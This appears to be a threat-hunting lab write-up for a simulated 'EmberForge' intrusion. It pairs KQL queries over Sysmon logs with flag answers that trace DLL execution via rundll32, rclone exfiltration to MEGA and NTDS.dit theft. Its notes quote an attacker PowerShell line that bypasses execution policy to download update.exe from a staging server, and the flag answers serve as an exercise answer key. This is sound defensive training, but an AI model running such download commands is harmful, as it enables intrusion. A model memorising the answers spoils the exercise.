# EmberForge-Threat-Hunt

Effected assets:

WORKSTATION EC2AMAZ-B9GHHO6 10.1.173.145 
SERVER EC2AMAZ-16V3AU4 10.1.57.66 
DOMAIN CONTROLLER EC2AMAZ-EEU3IA2 10.1.160.7

Table / log analytics:
EmberforgeX_CL
Actual time field = UTCTime_s 

Timeline: datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00)

Flag 1
The attacker needed to package data before stealing it. The compression commands reveal exactly what they were targeting. What directory was the source of the stolen data?
Format: Full path (e.g., C:\folder\subfolder)
Answer: C:\GameDev 2026-01-30 23:11:28.112 
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where CommandLine_s has_any ("7z", "zip", "compress", "rar", "tar", "Compress-Archive")
| project UtcTime_s, Computer, User_s, Image_s, CommandLine_s
| sort by todatetime(UtcTime_s) asc

Flag 2
The stolen data was uploaded to a cloud storage service. The exfiltration tool's command line contains both the service name and authentication details. What cloud provider received the data?

Format: Provider name
Answer: MEGA
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "3"
| where Image_s has "rclone"
| project UtcTime_s, Computer, User_s, Image_s, DestinationIp_s, DestinationPort_s, DestinationHostname_s

Flag3
Attackers make OPSEC mistakes. The exfiltration tool was configured with credentials visible in the command line. What email account was used to authenticate to the cloud service?

Answer: jwilson.vhr@proton.me
 EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where Image_s has "rclone"
| project UtcTime_s, Computer, User_s, Image_s, CommandLine_s


Flag 4
This was not just a workstation compromise. Evidence on the Domain Controller shows the attacker used volume snapshot techniques to access a locked system file. This file contains every credential in the domain. What was it?

Answer: Ntds.dit
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where Computer contains "EC2AMAZ-EEU3IA2"
| where EventCode_s == "1"
| where CommandLine_s has_any ("ntds")
| project UtcTime_s, Computer, User_s, Image_s, CommandLine_s

Flag 5
A cloud synchronisation tool was used to upload data externally. This tool is legitimate software commonly abused by threat actors. It was executed multiple times, not all successfully.

Format: filename.exe
Answer: rclone.exe  2026-01-30 23:06:36.115
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where CommandLine_s has_any ("rclone", "gamedev.zip")
| project UtcTime_s, Computer, User_s, CommandLine_s
| sort by todatetime(UtcTime_s) asc

Flag 6
The exfiltration tool made outbound network connections during the upload. Correlate the tool's process with its network activity (EventCode 3). What IP address received the stolen data?

Answer: 66.203.125.15 2026-01-30 23:12:53.154
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "3"
| where Image_s contains "rclone"
| project UtcTime_s, Computer, User_s,Image_s, DestinationIp_s, DestinationHostname_s, DestinationPort_s
| sort by todatetime(UtcTime_s) asc

Flag 7
The exfiltration tool was executed multiple times as the attacker troubleshot authentication issues. One execution method exposed credentials far more recklessly than the others. Compare all executions and find the plaintext password.

Answer: Summer2024!
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where Image_s has "rclone"
| project UtcTime_s, Computer, User_s, Image_s, CommandLine_s

Flag 8
Before exfiltration, the stolen data was compressed into an archive. The attacker used a built-in OS capability rather than third-party tools. This is a Living Off The Land technique. What cmdlet created the archive?

Answer: Compress-Archive
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where CommandLine_s has_any ("7z", "zip", "compress", "rar", "tar", "Compress-Archive")
| project UtcTime_s, Computer, User_s, Image_s, CommandLine_s
| sort by todatetime(UtcTime_s) asc

Flag9
The attacker did not bring tools manually. They downloaded utilities from external infrastructure they controlled. Multiple commands across the environment reference the same staging server.

Format: subdomain.domain.tld

Before you move on: Did you check for other exfiltration channels? DNS tunnelling? HTTP POST to external services? Document what you checked and ruled out.

Answer: http://sync.cloud-endpoint.net:8080
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where CommandLine_s has_any ("curl", "Invoke-WebRequest", "wget", "iwr", "ftp", "Upload", "post")
| project UtcTime_s, Computer, CommandLine_s
| sort by todatetime(UtcTime_s) asc



Flag10

The incident started with Lisa opening something from her desktop. Find the earliest malicious process creation event on the workstation. A Windows utility was used to load a file that does not belong in a normal user workflow.

Answer: review.dll 2026-01-30 21:27:03.300
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where Computer contains "B9GHHO6"
| where Image_s contains "rundll32"
| project UtcTime_s, User_s, ParentImage_s, Image_s, CommandLine_s
| sort by todatetime(UtcTime_s) asc

Flag 11
Look at the full path of the malicious file. The drive letter is significant. If the file is not on C:, consider how it got there. Mounted disk images (ISO, IMG, VHD) appear as virtual drives and bypass certain Windows security protections.

Answer: D:
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where Computer contains "B9GHHO6"
| where Image_s contains "rundll32"
| project UtcTime_s, User_s, ParentImage_s, Image_s, CommandLine_s
| sort by todatetime(UtcTime_s) asc


Flag 12 
The User field in process creation events tells you which account executed the payload. This is patient zero.

Format: username

Answer: lmartin



Flag13
Every process has a parent, and that parent has a parent. Trace the full execution chain from the user action through to the malicious file being loaded.

Answer: explorer.exe > rundll32.exe > review.dll


Flag14


Before the malicious DLL was loaded, the user opened a downloaded archive. A compression tool extracted its contents to a folder in the user's profile. This extraction step came before the DLL execution.

Answer: 7zG.exe > C:\Users\lmartin.EMBERFORGE\Downloads\EmberForge_Review\ 2026-01-30 21:24:04.656

Flag 15
Shortly after the initial DLL execution, a new executable appeared in a world-writable directory on the workstation. This became the attacker's primary tool for the rest of the operation.
Answer: C:\Users\Public\update.exe 2026-01-30 21:40:24.973
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where User_s contains @"EMBERFORGE\lmartin"
| where EventCode_s == "1"
| where CommandLine_s has_any ("Desktop", "Downloads", "Public", "lmartin")
| project UtcTime_s, Computer, User_s, ParentImage_s, Image_s, CommandLine_s
| sort by todatetime(UtcTime_s) asc

Flag 15
command-and-control network
The malware needs to communicate with the attacker. Sysmon EventCode 22 captures every DNS query a process makes. The domain will look designed to blend in with legitimate cloud traffic.
Answer: cdn.cloud-endpoint.net
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "22"
| where Computer contains "B9GHHO6"
| project UtcTime_s, Computer, Image_s, QueryName_s
| sort by todatetime(UtcTime_s) asc

Flag16
DNS queries resolve domains to IP addresses. The QueryResults field inside the EventCode 22 raw XML contains the resolved IPs. You will need to parse Raw_s.
Answer: 104.21.30.237
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "22"
| where Computer contains "B9GHHO6"
| extend ResolvedIP = extract("QueryResults'>([^<]+)", 1, Raw_s)
| where QueryName_s == "cdn.cloud-endpoint.net"
| project UtcTime_s, Computer, Image_s, QueryName_s, ResolvedIP
| sort by todatetime(UtcTime_s) asc











Notes: 

//Shows a C2 server powershell  -ep bypass -c "IWR -Uri 'http://sync.cloud-endpoint.net:8080/update.exe' -OutFile 'C:\Users\Public\update.exe'"
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where CommandLine_s has_any ("curl", "Invoke-WebRequest", "wget", "iwr", "ftp", "Upload")
| project UtcTime_s, Computer, CommandLine_s
| sort by todatetime(UtcTime_s) asc

//shows scheduled task
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where User_s contains @"EMBERFORGE\lmartin"
| where EventCode_s == "1"
| where CommandLine_s has_any ("Desktop", "Downloads", "Public", "lmartin")
| project UtcTime_s, Computer, User_s, ParentImage_s, Image_s, CommandLine_s
| sort by todatetime(UtcTime_s) asc

